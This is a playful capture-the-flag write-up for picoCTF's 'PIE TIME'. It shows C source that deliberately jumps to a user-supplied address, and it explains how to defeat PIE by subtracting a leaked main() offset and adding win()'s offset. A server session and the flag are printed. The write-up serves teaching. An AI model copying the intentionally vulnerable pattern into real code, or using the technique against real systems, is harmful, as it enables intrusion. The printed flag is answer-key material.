---
description: 'Author: Darkraicg492'
---

# PIE TIME

***

### 📝 Description

Can you get the flag? Beware… we got PIE 🍰

***

### 🛠️ Step 1: Reconnaissance aka “checksec go brrr”

Like every responsible hacker (or gremlin that touches random binaries at 3 AM), we start with:

```
└─$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   78 Symbols        No    0               1               vuln
```

Boom 💥 — it screams **PIE enabled**.\
Translation: “good luck bro, addresses go brrrr every run.”

I really recommend reading a bit of introduction about PIE so you can vibe along with me :P

Read here: [https://ir0nstone.gitbook.io/notes/binexp/stack/pie](https://ir0nstone.gitbook.io/notes/binexp/stack/pie)

***

### 📖 Step 2: Peeking at the source code

The challenge was kind enough to hand us the source code (tysm challenge author, very generous 🙏).

```
void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main); // Print main address here

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

Key things to note:

*   Program literally asks you:

    ```
    Enter the address to jump to: 
    ```

    And then it just… jumps there 💀. Like bruh, that’s the exploit.
* There’s a **win()** function that does the gamer thing: prints the flag.
* But the binary is PIE, so win()’s address plays hide & seek every execution.

***

### 🤔 So what’s the game plan?

We need the address of `win()`. But since PIE is here trolling us, we can’t hardcode it.

Luckily, the program prints the address of `main()` each run.\
That’s our anchor point.

#### Formula™️

```
base = main_address - main_offset
win_address = base + win_offset
```

***

### 🔍 Step 3: Grab those offsets

Let’s objdump this binary:

```
objdump -d vuln | grep ">:"
```

Output:

```
00000000000012a7 <win>:
000000000000133d <main>:
```

* win\_offset = `0x12a7`
* main\_offset = `0x133d`

***

### 🧮 Step 4: Put it all together

Say the program gives:

```
Address of main: 0x558860d7633d
```

We do some quick math (or just yeet it into Python because who does hex in their head lol):

```python
>>> hex((0x558860d7633d - 0x133d) + 0x12a7)
'0x558860d762a7'
```

That’s our win() address 🎯.

***

### 🎉 Step 5: Profit (aka flag time)

Send that bad boy into the program:

```atom
└─$ nc rescued-float.picoctf.net 54799
Address of main: 0x609e7137533d
Enter the address to jump to, ex => 0x12345: 0x609e713752a7
Your input: 609e713752a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_28a46dcd}
```

***

### 🔑 Key Takeaways&#x20;

* **PIE** = Position Independent Executable = addresses go brrrr each run.
* Use a **known leaked address** (like main) as your reference.
* Subtract the offset → get base → add target offset → 🎯 correct function address.
* Sometimes CTFs literally ask you for the address and let you win 😂.

***

✨ Moral of the story: PIE may shift, but math don’t lie. ✨

Again, I recommend reading some info here: [https://ir0nstone.gitbook.io/notes/binexp/stack/pie](https://ir0nstone.gitbook.io/notes/binexp/stack/pie)&#x20;
